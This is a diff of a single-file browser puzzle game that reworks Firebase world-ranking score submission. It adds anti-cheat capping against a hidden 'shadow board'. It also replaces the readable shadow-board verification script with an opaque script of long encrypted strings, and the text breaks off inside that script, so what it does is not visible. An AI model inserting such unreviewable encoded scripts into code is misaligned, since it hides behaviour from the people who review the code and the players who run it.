@@ -37235,6 +37235,12 @@ function endGame(){
   alert(msg)
 
   // ★ Firebaseに世界ランキングのスコアを送る
+  _sendWorldScoreAtEnd()
+  initGame()
+}
+
+// ★ ゲーム終了時の世界ランキング送信 (endGame 本体と多言語ラップ版の共通処理)
+function _sendWorldScoreAtEnd(){
   // 🛡️ 裏盤面チェック: 表と裏の破壊数がズレていたら裏の破壊数を採用する
   window._fbScore = (typeof _shVerifiedScore === 'function') ? _shVerifiedScore() : score;
   // 🧩 落ちものパズルは minigame の1バリアントだが、他ミニゲームと土俵が違うため専用モード名で送る
@@ -37258,14 +37264,10 @@ function endGame(){
     }
     maybeSendWorldScore();
     window._challengeForceEnd = _savedForceEnd;
-    initGame();
     return;
-  } else {
-    window._fbMode = currentMode;
   }
+  window._fbMode = currentMode;
   maybeSendWorldScore()
-
-  initGame()
 }
 
 // ============================================================
@@ -47891,9 +47893,8 @@ window.endGame = function(){
     if(currentMode==='point') _msg += '\n💰 今回獲得: '+pointCoins+'© ／ 累計保持: '+totalPointCoins+'©\n△ 今回獲得: '+trianglePoints+'△ ／ 累計保持: '+totalTrianglePoints+'△';
     alert(_msg);
     // ★ Firebaseに世界ランキングのスコアを送る
-    window._fbScore = score;
-    window._fbMode  = currentMode;
-    maybeSendWorldScore()
+    // 🛡️ 裏盤面チェック済みの破壊数で送信 (落ちものパズルの専用モード名/ペナルティも共通処理で)
+    _sendWorldScoreAtEnd();
     initGame();
   };
   sfx.gameEnd();
@@ -52422,7 +52423,12 @@ function _doResetAllSaveData(){
   // --- スコアを送る関数 ---
   window.sendWorldScore = async function() {
     const _mode  = window._fbMode  || 'standard';
-    const _score = window._fbScore || 0;
+    let _score = window._fbScore || 0;
+    // 🛡️ 裏盤面チェック済みの値を上限にする (送信前に _fbScore を書き換えられても無効)
+    try {
+      const _sealedV = (typeof window._shSealed === 'function') ? window._shSealed(_mode) : null;
+      if (typeof _sealedV === 'number') _score = Math.min(_score, _sealedV);
+    } catch (e) {}
 
     if (EXCLUDED_MODES.has(_mode)) return;
 
@@ -58140,400 +58146,5 @@ window.applyOfflineCachePolicy = function(){ /* PWA廃止により何もしな�
 })();
 </script>
 <noscript><style>#scSplash{display:none !important}</style></noscript>
-<script>
-// ============================================================
-// 🛡️ 裏盤面チェック (世界ランキング対象モードの破壊数検証)
-//   表の盤面とは別に「まったく同じ盤面」を裏で持ち、タップ・アイテム・自動の
-//   1手ごとに同じ操作を裏の盤面でも実行する。降ってくるブロック/爆弾は表で
-//   生成されたものをそのまま裏にも流し、乱数も表で使った値を裏で再生するので、
-//   正規のプレイなら表と裏の破壊数は必ず一致する。
-//   ランキング送信時に表と裏の破壊数がズレていたら裏の破壊数を採用する。
-//   対象: 通常 / シンプル / 20×20 / 拡張 / 落ちものパズル (自動ONでも有効)
-// ============================================================
-;(function(){
-  const SH_MODES = { standard:1, simple:1, hardcore:1, extended:1 }
-  const _rnd = Math.random.bind(Math)
-  let _in = false            // 裏の盤面で実行中
-  let _pause = 0             // 表側: 乱数記録を一時停止 (裏では実行しない処理の中)
-  let _rec = null            // 表側: この1手で使った乱数
-  let _genRec = null         // 表側: この1手で生成されたブロック
-  let _replay = null         // 裏側: 再生する乱数 {a,i}
-  let _genQ = null           // 裏側: 再生するブロック {a,i}
-  let _bypass = false        // 裏側: 再生を使わず生の乱数を使う
-  let _depth = 0
-  let _aaHit = false         // 表側: clickBlock 中に afterAction が走ったか
-  let _miss = 0              // 裏側: 再生データが足りなかった回数 (=表裏がズレた)
-  const S = { valid:false, mode:null }
-  const D = { valid:false, g:null, piece:null, next:null, score:0, landing:false, over:false }
-
-  const clone = v => (v==null || typeof v!=='object') ? v : JSON.parse(JSON.stringify(v))
-  const cloneGrid = g => Array.isArray(g) ? g.map(row => Array.isArray(row) ? row.map(clone) : row) : g
-  function warn(){ try{ console.warn.apply(console, ['🛡️[shadow]'].concat([].slice.call(arguments))) }catch(e){} }
-
-  Math.random = function(){
-    if(_in && _replay && !_bypass){
-      if(_replay.i < _replay.a.length) return _replay.a[_replay.i++]
-      _miss++
-      return _rnd()
-    }
-    const v = _rnd()
-    if(_rec && _pause === 0 && !_in) _rec.push(v)
-    return v
-  }
-
-  // 表の1手の前後で値を保つカウンタ類 (裏で再実行しても二重に増えないよう退避/復元する)
-  const snapCounters = function(){ return {
-    _activeChallengeId: (typeof _activeChallengeId !== 'undefined') ? _activeChallengeId : undefined,
-    _lastHopeCount: (typeof _lastHopeCount !== 'undefined') ? _lastHopeCount : undefined,
-    _lastHopeSelecting: (typeof _lastHopeSelecting !== 'undefined') ? _lastHopeSelecting : undefined,
-    _presentDestroyed: (typeof _presentDestroyed !== 'undefined') ? _presentDestroyed : undefined,
-    _timeattackClockDestroyed: (typeof _timeattackClockDestroyed !== 'undefined') ? _timeattackClockDestroyed : undefined,
-    _totalRefinedBlocksDestroyed: (typeof _totalRefinedBlocksDestroyed !== 'undefined') ? _totalRefinedBlocksDestroyed : undefined,
-    _triangleBreakMode: (typeof _triangleBreakMode !== 'undefined') ? _triangleBreakMode : undefined,
-    _triangleBreaksUsed: (typeof _triangleBreaksUsed !== 'undefined') ? _triangleBreaksUsed : undefined,
-    _pointshopItemsBought: (typeof _pointshopItemsBought !== 'undefined') ? _pointshopItemsBought : undefined,
-    _vsAttacksSent: (typeof _vsAttacksSent !== 'undefined') ? _vsAttacksSent : undefined,
-    _vsBigBombsSent: (typeof _vsBigBombsSent !== 'undefined') ? _vsBigBombsSent : undefined,
-    bombOnlyUses: (typeof bombOnlyUses !== 'undefined') ? bombOnlyUses : undefined,
-    boxBlockCount: (typeof boxBlockCount !== 'undefined') ? boxBlockCount : undefined,
-    clockDestroyed: (typeof clockDestroyed !== 'undefined') ? clockDestroyed : undefined,
-    colorBombUsed: (typeof colorBombUsed !== 'undefined') ? colorBombUsed : undefined,
-    extBombCreated: (typeof extBombCreated !== 'undefined') ? extBombCreated : undefined,
-    extBombOnlyDestroyed: (typeof extBombOnlyDestroyed !== 'undefined') ? extBombOnlyDestroyed : undefined,
-    extHpDestroyed: (typeof extHpDestroyed !== 'undefined') ? extHpDestroyed : undefined,
-    goldenDestroyed: (typeof goldenDestroyed !== 'undefined') ? goldenDestroyed : undefined,
-    itemUses: (typeof itemUses !== 'undefined') ? itemUses : undefined,
-    mysteryDestroyed: (typeof mysteryDestroyed !== 'undefined') ? mysteryDestroyed : undefined,
-    pointCoins: (typeof pointCoins !== 'undefined') ? pointCoins : undefined,
-    presentBlockCount: (typeof presentBlockCount !== 'undefined') ? presentBlockCount : undefined,
-    rainbowDestroyed: (typeof rainbowDestroyed !== 'undefined') ? rainbowDestroyed : undefined,
-    refinedNodes: (typeof refinedNodes !== 'undefined') ? refinedNodes : undefined,
-    shiftDestroyed: (typeof shiftDestroyed !== 'undefined') ? shiftDestroyed : undefined,
-    specialUses: (typeof specialUses !== 'undefined') ? specialUses : undefined,
-    tBlockDestroyed: (typeof tBlockDestroyed !== 'undefined') ? tBlockDestroyed : undefined,
-    tBlockUses: (typeof tBlockUses !== 'undefined') ? tBlockUses : undefined,
-    totalPointCoins: (typeof totalPointCoins !== 'undefined') ? totalPointCoins : undefined,
-    totalTrianglePoints: (typeof totalTrianglePoints !== 'undefined') ? totalTrianglePoints : undefined,
-    trianglePoints: (typeof trianglePoints !== 'undefined') ? trianglePoints : undefined,
-    _lowGravFullRefill: (typeof _lowGravFullRefill !== 'undefined') ? _lowGravFullRefill : undefined,
-    _reverseRmColorBonus: (typeof _reverseRmColorBonus !== 'undefined') ? _reverseRmColorBonus : undefined,
-    digitScore: (typeof digitScore !== 'undefined') ? digitScore : undefined
-  } }
-  const restoreCounters = function(o){
-    if(typeof _activeChallengeId !== 'undefined') _activeChallengeId = o._activeChallengeId
-    if(typeof _lastHopeCount !== 'undefined') _lastHopeCount = o._lastHopeCount
-    if(typeof _lastHopeSelecting !== 'undefined') _lastHopeSelecting = o._lastHopeSelecting
-    if(typeof _presentDestroyed !== 'undefined') _presentDestroyed = o._presentDestroyed
-    if(typeof _timeattackClockDestroyed !== 'undefined') _timeattackClockDestroyed = o._timeattackClockDestroyed
-    if(typeof _totalRefinedBlocksDestroyed !== 'undefined') _totalRefinedBlocksDestroyed = o._totalRefinedBlocksDestroyed
-    if(typeof _triangleBreakMode !== 'undefined') _triangleBreakMode = o._triangleBreakMode
-    if(typeof _triangleBreaksUsed !== 'undefined') _triangleBreaksUsed = o._triangleBreaksUsed
-    if(typeof _pointshopItemsBought !== 'undefined') _pointshopItemsBought = o._pointshopItemsBought
-    if(typeof _vsAttacksSent !== 'undefined') _vsAttacksSent = o._vsAttacksSent
-    if(typeof _vsBigBombsSent !== 'undefined') _vsBigBombsSent = o._vsBigBombsSent
-    if(typeof bombOnlyUses !== 'undefined') bombOnlyUses = o.bombOnlyUses
-    if(typeof boxBlockCount !== 'undefined') boxBlockCount = o.boxBlockCount
-    if(typeof clockDestroyed !== 'undefined') clockDestroyed = o.clockDestroyed
-    if(typeof colorBombUsed !== 'undefined') colorBombUsed = o.colorBombUsed
-    if(typeof extBombCreated !== 'undefined') extBombCreated = o.extBombCreated
-    if(typeof extBombOnlyDestroyed !== 'undefined') extBombOnlyDestroyed = o.extBombOnlyDestroyed
-    if(typeof extHpDestroyed !== 'undefined') extHpDestroyed = o.extHpDestroyed
-    if(typeof goldenDestroyed !== 'undefined') goldenDestroyed = o.goldenDestroyed
-    if(typeof itemUses !== 'undefined') itemUses = o.itemUses
-    if(typeof mysteryDestroyed !== 'undefined') mysteryDestroyed = o.mysteryDestroyed
-    if(typeof pointCoins !== 'undefined') pointCoins = o.pointCoins
-    if(typeof presentBlockCount !== 'undefined') presentBlockCount = o.presentBlockCount
-    if(typeof rainbowDestroyed !== 'undefined') rainbowDestroyed = o.rainbowDestroyed
-    if(typeof refinedNodes !== 'undefined') refinedNodes = o.refinedNodes
-    if(typeof shiftDestroyed !== 'undefined') shiftDestroyed = o.shiftDestroyed
-    if(typeof specialUses !== 'undefined') specialUses = o.specialUses
-    if(typeof tBlockDestroyed !== 'undefined') tBlockDestroyed = o.tBlockDestroyed
-    if(typeof tBlockUses !== 'undefined') tBlockUses = o.tBlockUses
-    if(typeof totalPointCoins !== 'undefined') totalPointCoins = o.totalPointCoins
-    if(typeof totalTrianglePoints !== 'undefined') totalTrianglePoints = o.totalTrianglePoints
-    if(typeof trianglePoints !== 'undefined') trianglePoints = o.trianglePoints
-    if(typeof _lowGravFullRefill !== 'undefined') _lowGravFullRefill = o._lowGravFullRefill
-    if(typeof _reverseRmColorBonus !== 'undefined') _reverseRmColorBonus = o._reverseRmColorBonus
-    if(typeof digitScore !== 'undefined') digitScore = o.digitScore
-  }
-
-  function stdActive(){
-    return S.valid && S.mode === currentMode && !!SH_MODES[currentMode]
-        && !(typeof isDroppingActive === 'function' && isDroppingActive())
-  }
-
-  // 表 → 裏 へ盤面を丸ごとコピー (ゲーム開始 / 続きから復元)
-  function syncStd(keepScore){
-    if(!SH_MODES[currentMode]){ S.valid = false; return }
-    const sameGame = S.valid && S.mode === currentMode
-    S.grid = cloneGrid(grid)
-    S.score = (keepScore && sameGame) ? S.score : (Number(score) || 0)
-    S.level = level
-    S.colors = Array.isArray(availableColors) ? availableColors.slice() : availableColors
-    S.obstacle = clone(obstacleBlock)
-    S.shiftTick = shiftTick
-    S.gpos = clone(_gBlockPos)
-    S.hundredAt = _hundredBlockSpawnAt
-    S.mode = currentMode
-    S.valid = true
-  }
-
-  // ---- 裏で実行しない処理 (描画・保存・実績・音・通知など) ----
-  const NOOP = ['render','flashShiftBlocks','updateAchBtn','laRecordTurn','_saveBoardState','_challengeOnScoreUpdate',
-    'checkAchievements','saveAchievements','onBlocksRemoved','onBombExploded','onBigBombCreated','onBoxBombSpawned',
-    'onItemUsed','onBombOnlyItemUsed','onTBlockItemUsed','onSpecialItemUsed','onAutoModeUsed','clearHints','appAlert','alert',
-    'initGame','endGame','showLastHopeBanner','saveLastHopeCount','saveTotalPointCoins','saveTotalTrianglePoints',
-    'saveRefinedNodes','saveTotalRefinedBlocksDestroyed','showPointCoinToast','showTrianglePointToast','saveDigitScore',
-    'saveScore','checkDroppingUnlock','renderItems','onShieldBlockDestroyed','unlockGBlock','advanceTutorialStep',
-    'checkGravityMinigameUnlock','checkPlacingMinigameUnlock','showExtraScoreUnlock','_showExtraScoreUnlockNotif']
-  const CUSTOM = {
-    // 破壊数だけ数える (累計/実績/得点は表で処理済み)
-    addDestroyedCountForCell: function(cell, count){
-      if(count === undefined) count = 1
-      score += count
-      if(cell && typeof cell === 'object' && cell.isG) _gBlockPos = null
-      // 表と同じ順番で 100ブロック → Gブロック の出現処理を行う
-      if(typeof spawnHundredBlockIfNeeded === 'function') spawnHundredBlockIfNeeded()
-      shadowScoreHook()
-    },
-    onScoreUpdate: function(){ shadowScoreHook() }
-  }
-  // 盤面に影響するのは Gブロックの出現だけ (onScoreUpdate の該当部分)
-  function shadowScoreHook(){
-    if(currentMode === 'hardcore' && typeof G_BLOCK_SCORE_THRESHOLD !== 'undefined' && score >= G_BLOCK_SCORE_THRESHOLD
-       && gBlockUnlocked && !_gBlockPos && typeof spawnGBlockIfNeeded === 'function') spawnGBlockIfNeeded()
-  }
-  function wrapSide(name, shadowImpl){
-    const orig = window[name]
-    if(typeof orig !== 'function') return
-    window[name] = function(){
-      if(_in) return shadowImpl ? shadowImpl.apply(this, arguments) : undefined
-      _pause++
-      try { return orig.apply(this, arguments) } finally { _pause-- }
-    }
-  }
-  // 乱数を表裏で同じ順番に使う処理 (onScoreUpdate の中から呼ばれても記録する)
-  function wrapForceRecord(name){
-    const orig = window[name]
-    if(typeof orig !== 'function') return
-    window[name] = function(){
-      const p = _pause; _pause = 0
-      try { return orig.apply(this, arguments) } finally { _pause = p }
-    }
-  }
-
-  // 降ってくるブロック: 表で生成したものを記録し、裏では同じものを同じ順に流す
-  function wrapGenerate(){
-    const orig = window.generateCell
-    if(typeof orig !== 'function') return
-    window.generateCell = function(){
-      if(_in){
-        if(_genQ && _genQ.i < _genQ.a.length) return clone(_genQ.a[_genQ.i++])
-        _miss++
-        _bypass = true
-        try { return orig.apply(this, arguments) } finally { _bypass = false }
-      }
-      _pause++
-      let c
-      try { c = orig.apply(this, arguments) } finally { _pause-- }
-      if(_genRec) _genRec.push(clone(c))
-      return c
-    }
-  }
-
-  function wrapAfterAction(){
-    const orig = window.afterAction
-    if(typeof orig !== 'function') return
-    window.afterAction = function(){
-      if(!_in) _aaHit = true
-      return orig.apply(this, arguments)
-    }
-  }
-
-  // 1手を裏の盤面で再実行する
-  function runShadow(orig, args, s0, rnd, gen){
-    const s1 = snapCounters()
-    const R = { grid, score, level, colors: availableColors, obstacle: obstacleBlock, shiftTick, gpos: _gBlockPos, hundredAt: _hundredBlockSpawnAt, lastClick: _lastClick, ach: _ach() }
-    restoreCounters(s0)
-    grid = S.grid; score = S.score; level = S.level; availableColors = S.colors
-    obstacleBlock = S.obstacle; shiftTick = S.shiftTick; _gBlockPos = S.gpos; _hundredBlockSpawnAt = S.hundredAt; _lastClick = 0
-    _in = true; _replay = { a: rnd, i: 0 }; _genQ = { a: gen, i: 0 }
-    const miss0 = _miss
-    try { orig.apply(null, args) }
-    catch(e){ warn('shadow error', e && e.message) }
-    finally {
-      if(_replay.i !== _replay.a.length || _genQ.i !== _genQ.a.length) _miss++
-      _in = false; _replay = null; _genQ = null
-      S.grid = grid; S.score = Number(score) || 0; S.level = level; S.colors = availableColors
-      S.obstacle = obstacleBlock; S.shiftTick = shiftTick; S.gpos = _gBlockPos; S.hundredAt = _hundredBlockSpawnAt
-      grid = R.grid; score = R.score; level = R.level; availableColors = R.colors
-      obstacleBlock = R.obstacle; shiftTick = R.shiftTick; _gBlockPos = R.gpos; _hundredBlockSpawnAt = R.hundredAt; _lastClick = R.lastClick
-      restoreCounters(s1)
-      _achRestore(R.ach)
-    }
-    if(_miss !== miss0) warn('board diverged', currentMode, 'front=' + score, 'shadow=' + S.score)
-  }
-  // 🔮 @ポイント表示は remove/explode が直接書き換えるので表の値に戻す
-  function _ach(){ return null }
-  function _achRestore(){
-    try{
-      const bal = document.getElementById('refinedNodeBalance')
-      if(bal && typeof fmtNode === 'function' && typeof refinedNodes !== 'undefined') bal.textContent = fmtNode(refinedNodes)
-    }catch(e){}
-  }
-
-  // gate: 表で実際に手が成立したかの判定
-  function wrapAction(name, gate){
-    const orig = window[name]
-    if(typeof orig !== 'function') return
-    window[name] = function(){
-      const args = [].slice.call(arguments)
-      if(_in || _depth > 0 || !stdActive()) return orig.apply(this, args)
-      const s0 = snapCounters()
-      _depth++
-      _rec = []; _genRec = []; _aaHit = false
-      let ret, rnd, gen
-      try { ret = orig.apply(this, args) }
-      finally { _depth--; rnd = _rec; gen = _genRec; _rec = null; _genRec = null }
-      try { if(stdActive() && gate(ret)) runShadow(orig, args, s0, rnd, gen) } catch(e){ warn('wrap error', e && e.message) }
-      return ret
-    }
-  }
-
-  // ---- 🧩 落ちものパズル (専用エンジン: 裏は独立した簡易エンジンで再現) ----
-  function dropActive(){ return typeof isDroppingActive === 'function' && isDroppingActive() }
-  function dGrid(){ const g=[]; for(let r=0;r<DROP_ROWS;r++){ const row=[]; for(let c=0;c<DROP_COLS;c++) row.push(null); g.push(row) } return g }
-  function dResolve(){
-    let guard = 0
-    _dropGravityOn(D.g)
-    while(guard++ < 100){
-      const groups = _dropFindMatchesOn(D.g)
-      if(!groups.length) break
-      groups.forEach(gr => gr.forEach(p => { if(D.g[p.r][p.c]){ D.score++; D.g[p.r][p.c] = null } }))
-      _dropGravityOn(D.g)
-    }
-  }
-  function dLand(pos){
-    const pc = D.piece
-    if(!pc || D.over) return
-    let r = pos.r, c = pos.c
-    // 表の着地位置が裏の盤面で成立しない場合は、その列でハードドロップした位置にする
-    if(!_dropCanPlaceOn(D.g, pc, r, c) || _dropCanPlaceOn(D.g, pc, r + 1, c)){
-      if(!_dropCanPlaceOn(D.g, pc, 0, c)){ warn('drop: cannot place', c); D.over = true; return }
-      r = 0
-      let guard = 0
-      while(_dropCanPlaceOn(D.g, pc, r + 1, c) && guard++ < DROP_ROWS + 5) r++
-      warn('drop: landing differs', pos.r + ',' + pos.c, '->', r + ',' + c)
-    }
-    for(const cell of pc.cells){
-      const rr = r + cell.dr, cc = c + cell.dc
-      if(rr >= 0 && rr < DROP_ROWS && cc >= 0 && cc < DROP_COLS) D.g[rr][cc] = { num: cell.num }
-    }
-    D.piece = null
-    dResolve()
-  }
-  function wrapDrop(){
-    const oInit = window.dropInitGrid, oSpawn = window.dropSpawnPiece, oLand = window.dropLandPiece, oItem = window.dropUseItem
-    if(typeof oInit === 'function') window.dropInitGrid = function(){
-      const r = oInit.apply(this, arguments)
-      D.g = dGrid(); D.piece = null; D.next = null; D.score = Number(score) || 0; D.over = false; D.landing = false; D.valid = true
-      return r
-    }
-    if(typeof oSpawn === 'function') window.dropSpawnPiece = function(){
-      const r = oSpawn.apply(this, arguments)
-      if(D.valid && _dropPiece){
-        D.next = clone(_dropPiece)
-        if(!D.landing) D.piece = D.next
-      }
-      return r
-    }
-    if(typeof oLand === 'function') window.dropLandPiece = function(){
-      if(!D.valid || !_dropPiece || !dropActive()) return oLand.apply(this, arguments)
-      // 裏を先に着地させる (表の着地でゲームオーバー→endGame が走っても裏が遅れないように)
-      const pos = { r: _dropPiece.r, c: _dropPiece.c }
-      try { dLand(pos) } catch(e){ warn('drop land error', e && e.message) }
-      D.next = null; D.landing = true
-      let ret
-      try { ret = oLand.apply(this, arguments) } finally { D.landing = false }
-      D.piece = D.next
-      return ret
-    }
-    if(typeof oItem === 'function') window.dropUseItem = function(targetNum){
-      const ret = oItem.apply(this, arguments)
-      if(ret === true && D.valid && !D.over){
-        try {
-          let num = targetNum
-          if(num == null){
-            const cnt = {}; let best = null, bc = 0
-            D.g.forEach(row => row.forEach(cell => { if(cell) cnt[cell.num] = (cnt[cell.num] || 0) + 1 }))
-            for(const n in cnt){ if(cnt[n] > bc){ bc = cnt[n]; best = parseInt(n, 10) } }
-            num = best
-          }
-          if(num != null){
-            D.g.forEach(row => row.forEach((cell, c) => { if(cell && cell.num === num){ D.score++; row[c] = null } }))
-            dResolve()
-          }
-        } catch(e){ warn('drop item error', e && e.message) }
-      }
-      return ret
-    }
-  }
-
-  // ランキング送信値: 表と裏の破壊数がズレていたら裏の破壊数を採用
-  window._shVerifiedScore = function(){
-    const front = Number(score) || 0
-    if(dropActive()){
-      if(!D.valid) return front
-      if(Math.floor(front) !== D.score){ warn('score mismatch (dropping)', 'front=' + front, 'shadow=' + D.score, '-> shadow'); return D.score }
-      return front
-    }
-    if(SH_MODES[currentMode] && S.valid && S.mode === currentMode){
-      if(front !== S.score){ warn('score mismatch', currentMode, 'front=' + front, 'shadow=' + S.score, '-> shadow'); return S.score }
-    }
-    return front
-  }
-  window._bdShadowState = function(){
-    return { std: { valid: S.valid, mode: S.mode, score: S.score, grid: S.grid }, drop: { valid: D.valid, score: D.score, g: D.g }, miss: _miss }
-  }
-
-  function install(){
-    NOOP.forEach(n => wrapSide(n, null))
-    Object.keys(CUSTOM).forEach(n => wrapSide(n, CUSTOM[n]))
-    wrapForceRecord('spawnGBlockIfNeeded')
-    wrapForceRecord('spawnHundredBlockIfNeeded')
-    wrapGenerate()
-    wrapAfterAction()
-    // 音は裏では鳴らさない
-    try {
-      if(typeof sfx !== 'undefined' && sfx && typeof sfx === 'object'){
-        Object.keys(sfx).forEach(k => {
-          const f = sfx[k]; if(typeof f !== 'function') return
-          sfx[k] = function(){ if(_in) return; _pause++; try { return f.apply(this, arguments) } finally { _pause-- } }
-        })
-      }
-    } catch(e){}
-    wrapAction('clickBlock', () => _aaHit)
-    wrapAction('applyLastHope', r => r === true)
-    wrapAction('_autoStdTick', r => r === true)
-    ;['useItem','useSpecialItem','useBombOnlyItem','useTBlockItem','useShiftItem'].forEach(n => wrapAction(n, () => true))
-    wrapDrop()
-    // ゲーム開始/続きから で表の盤面を裏へコピー
-    const oInit = window.initGame
-    if(typeof oInit === 'function') window.initGame = function(resetScore){
-      if(_in) return
-      const r = oInit.apply(this, arguments)
-      try { syncStd(resetScore === false) } catch(e){}
-      return r
-    }
-    const oRestore = window._restoreBoardState
-    if(typeof oRestore === 'function') window._restoreBoardState = function(){
-      const r = oRestore.apply(this, arguments)
-      if(r){ try { S.valid = false; syncStd(false) } catch(e){} }
-      return r
-    }
-    try { syncStd(false) } catch(e){}
-  }
-  install()
-})()
-</script>
+<script>!function(){for(var Y=["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